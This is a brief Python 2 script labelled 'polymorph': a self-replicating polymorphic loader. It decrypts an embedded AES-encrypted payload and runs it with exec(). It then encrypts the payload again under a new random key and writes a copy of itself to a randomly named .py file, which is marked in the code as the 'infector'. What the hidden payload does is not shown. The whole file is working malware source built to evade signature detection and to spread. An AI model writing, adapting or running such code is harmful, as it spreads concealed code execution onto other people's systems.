#polymorph
C='GDmOwonWS0wntsLmljmhU19sAYepc6LrXT5PZjmeeRMZ8WniEYl1Z7Jbhu0pJXCIKI35GiouSwtUBRs5XG1+hl2q1DEeaWlU9yKtd40TqSmj691XYuPimKV/EBPiK2VFN+X5JiUkTow+mX7KX2aIhvLHWHqTm5tr0Y4J9JglwCo=='
K='FlCGGzSETMVdHrH4JMvLWQQZAkaTrDNn57ppedXVsuI=='
#imports
import sys
from base64 import b64encode
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad,unpad
#helpers
def E(PTX,KEY):
	return b64encode(AES.new(b64decode(KEY),AES.MODE_ECB).encrypt(pad(PTX,AES.block_size)));
def D(CTX,KEY):
	return unpad(AES.new(b64decode(KEY),AES.MODE_ECB).decrypt(b64decode(CTX)),AES.block_size);
def dynload(code):
	exec(code)
#identifier
print "i came with "+C+K
#unwrapper
PAYLOAD=D(C,K)
#executor
dynload(PAYLOAD)
#mutator
K_dash=b64encode(get_random_bytes(32))
C_dash=E(PAYLOAD,K_dash)
#infector
BODY=open(sys.argv[0],"r").read()
BODY=BODY.replace(BODY[BODY.find("C='")+3:BODY.find("\'\nK='")-1],C_dash)
BODY=BODY.replace(BODY[BODY.find("K='")+3:BODY.find("\'\n#imports")-1],K_dash)
open(b64encode(get_random_bytes(5))+".py","w").write(BODY)
#end

